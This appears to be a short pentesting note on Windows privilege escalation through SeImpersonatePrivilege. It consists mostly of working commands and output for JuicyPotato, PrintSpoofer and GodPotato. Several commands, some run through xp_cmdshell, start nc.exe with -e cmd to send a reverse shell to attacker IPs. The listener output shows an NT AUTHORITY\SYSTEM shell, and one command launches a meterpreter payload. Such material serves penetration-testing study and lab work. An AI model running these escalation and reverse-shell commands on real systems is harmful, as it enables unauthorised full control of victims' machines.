This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State    

============================= ========================================= ======== 

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

With the `SeImpersonatePrivilege` privilege enabled, it is possible to perform privilege escalation:

```bash
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.35 8443 -e cmd.exe" -t *
```

```bash
sudo nc -lvp 8443
Listening on 0.0.0.0 8443
Connection received on 10.129.224.155 49736
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami 
whoami 
nt authority\system
```

Or a `meterpreter` shell:

```bash
.\JuicyPotato.exe -l 53375 -p c:\windows\temp\shell.exe -t * -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
```

`JuicyPotato` doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.

Newer version of Windows, `PrintSpoofer/RougePotato/GodPotato` should work:

```bash
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.15.35 8443 -e cmd"
```

GodPotato works well:
`
```bash
PS C:\windows\tasks> .\GodPotato-NET4.exe -cmd "cmd /c c:\windows\tasks\nc.exe -e cmd 10.10.14.164 8888"
[*] CombaseModule: 0x140735450447872
[*] DispatchTable: 0x140735453038920
[*] UseProtseqFunction: 0x140735452330816
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\7ae6247b-fbed-4035-b3f9-1c4a7d95764f\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000f402-0600-ffff-61d6-4269b7a227d2
[*] DCOM obj OXID: 0xde03869d0e9f65b
[*] DCOM obj OID: 0xd055ebd80be812fe
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 944 Token:0x768  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3632
```


